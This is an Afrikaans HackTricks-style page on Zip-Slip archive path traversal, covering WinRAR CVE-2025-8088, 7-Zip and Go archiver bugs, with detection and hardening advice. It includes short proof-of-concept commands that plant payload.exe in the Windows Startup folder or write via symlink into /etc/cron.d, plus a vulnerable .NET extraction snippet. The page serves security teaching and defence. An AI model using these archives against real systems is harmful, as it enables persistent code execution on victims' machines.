# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## Oorsig

Baie archive-formate (ZIP, RAR, TAR, 7-ZIP, ens.) laat elke entry toe om sy eie **interne pad** te bevat. Wanneer 'n extraction utility daardie pad blindelings respekteer, sal 'n vervaardigde lêernaam wat `..` of 'n **absolute pad** bevat (bv. `C:\Windows\System32\`) buite die gebruiker-gekose directory geskryf word.
Hierdie klas kwesbaarheid staan wyd bekend as *Zip-Slip* of **archive extraction path traversal**.<sup>[[6]](#references)</sup>

Gevolge wissel van die oorskryf van arbitrêre lêers tot die direkte bereiking van **remote code execution (RCE)** deur 'n payload in 'n **auto-run**-ligging te plaas, soos die Windows *Startup*-lêergids.

## Oorsaak

1. Attacker skep 'n archive waarin een of meer file headers die volgende bevat:
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* Of vervaardigde **symlinks** wat buite die target dir resolve (algemeen in ZIP/TAR op *nix).
2. Victim extract die archive met 'n kwesbare tool wat die embedded path vertrou (of symlinks volg) in plaas daarvan om dit te sanitise of extraction onder die gekose directory af te dwing.
3. Die file word in die attacker-beheerde ligging geskryf en uitgevoer/geladen die volgende keer wanneer die system of user daardie path trigger.

### .NET `Path.Combine` + `ZipArchive` traversal

'n Algemene .NET anti-pattern is om die beoogde destination met user-beheerde `ZipArchiveEntry.FullName` te combineer en dit te extract sonder path normalisation:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- As `entry.FullName` met `..\\` begin, traverseer dit; indien dit 'n **absolute path** is, word die linkerkant-komponent heeltemal weggegooi, wat 'n **arbitrêre lêerskrywing** as die ekstraksie-identiteit oplewer.
- Proof-of-concept-argief om na 'n sibling `app`-gids te skryf wat deur 'n geskeduleerde scanner gemonitor word:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
Deur daardie ZIP in die gemonitorde inbox te plaas, lei dit tot `C:\samples\app\0xdf.txt`, wat traversal buite `C:\samples\queue\` bewys en opvolgende primitives moontlik maak (bv. DLL hijacks).

## Werklike voorbeeld – WinRAR ≤ 7.12 (CVE-2025-8088)

WinRAR for Windows (insluitend die `rar` / `unrar` CLI, die DLL en die portable source) kon nie lêername tydens extraction valideer nie.
’n Kwaadwillige RAR-argief met ’n inskrywing soos:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
sou uiteindelik **buite** die geselekteerde uitvoergids en binne die gebruiker se *Startup*-lêergids beland. Na aanmelding voer Windows outomaties alles uit wat daar teenwoordig is, wat *persistente* RCE verskaf.<sup>[[5]](#references)</sup>

### Skep van ’n PoC-argief (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
Opsies wat gebruik is:
* `-ep`  – stoor lêerpaaie presies soos gegee (moenie vooraanstaande `./` snoei nie).

Lewer `evil.rar` aan die slagoffer en gee hulle opdrag om dit met ’n kwesbare WinRAR-build te onttrek.

### Waargenome Exploitation in die Wild

ESET het spear-phishing-veldtogte deur RomCom (Storm-0978/UNC2596) gerapporteer wat RAR-argiewe aangeheg het wat CVE-2025-8088 misbruik om aangepaste backdoors te ontplooi en ransomware-bedrywighede te fasiliteer.<sup>[[5]](#references)</sup>

## Nuwer Gevalle (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP-inskrywings wat **symbolic links** was, is tydens extraction gedereferensieer, wat aanvallers toegelaat het om uit die bestemminggids te ontsnap en arbitrêre paaie te oorskryf. Gebruikerinteraksie is bloot om die argief *oop te maak/te onttrek*.<sup>[[1]](#references)</sup>
* **Affected**: 7-Zip 21.02–24.09 (Windows- en Linux-builds). Herstel in **25.00** (Julie 2025) en later.
* **Impact path**: Oorskryf `Start Menu/Programs/Startup` of diens-run-liggings → kode loop tydens die volgende aanmelding of diensherbegin.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
Op ’n patched build sal `/etc/cron.d` nie geraak word nie; die symlink word as ’n link binne /tmp/target onttrek.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()` volg `../` en symlinked ZIP-inskrywings, en skryf buite `outputDir`.<sup>[[2]](#references)</sup>
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (projek nou deprecated).
* **Fix**: Skakel oor na `mholt/archives` ≥ 0.1.0 of implementeer canonical-path checks voordat daar geskryf word.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – Lys argiefinskrywings en merk enige naam wat `../`, `..\\`, *absolute paths* (`/`, `C:`) bevat, of inskrywings van die tipe *symlink* waarvan die teiken buite die extraction-gids is.
* **Canonicalisation** – Verseker dat `realpath(join(dest, name))` steeds met `dest` begin. Verwerp dit andersins.<sup>[[3]](#references)</sup>
* **Sandbox extraction** – Decomprimeer na ’n weggooibare gids met ’n *safe* extractor (byvoorbeeld `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00) en verifieer dat die resulterende paaie binne die gids bly.
* **Endpoint monitoring** – Genereer ’n alert oor nuwe uitvoerbare lêers wat na `Startup`/`Run`/`cron`-liggings geskryf word kort nadat ’n argief deur WinRAR/7-Zip/etc. oopgemaak is.

## Mitigation & Hardening

1. **Update the extractor** – WinRAR 7.13+ en 7-Zip 25.00+ implementeer path/symlink-sanitisation. Albei tools het steeds nie auto-update nie.
2. Onttrek argiewe met “**Do not extract paths**” / “**Ignore paths**” waar moontlik.
3. Op Unix, verlaag privileges en mount ’n **chroot/namespace** voor extraction; op Windows, gebruik **AppContainer** of ’n sandbox.
4. Indien jy custom code skryf, normaliseer met `realpath()`/`PathCanonicalize()` **voor** create/write, en verwerp enige inskrywing wat uit die bestemming ontsnap.

## Additional Affected / Historical Cases

* 2018 – Massiewe *Zip-Slip*-advies deur Snyk wat baie Java/Go/JS-libraries geraak het.<sup>[[6]](#references)</sup>
* 2023 – 7-Zip CVE-2023-4011 soortgelyke traversal tydens `-ao` merge.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377) TAR extraction traversal in slugs (patch in v1.2).<sup>[[7]](#references)</sup>
* Enige custom extraction logic wat versuim om `PathCanonicalize` / `realpath` voor write aan te roep.

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
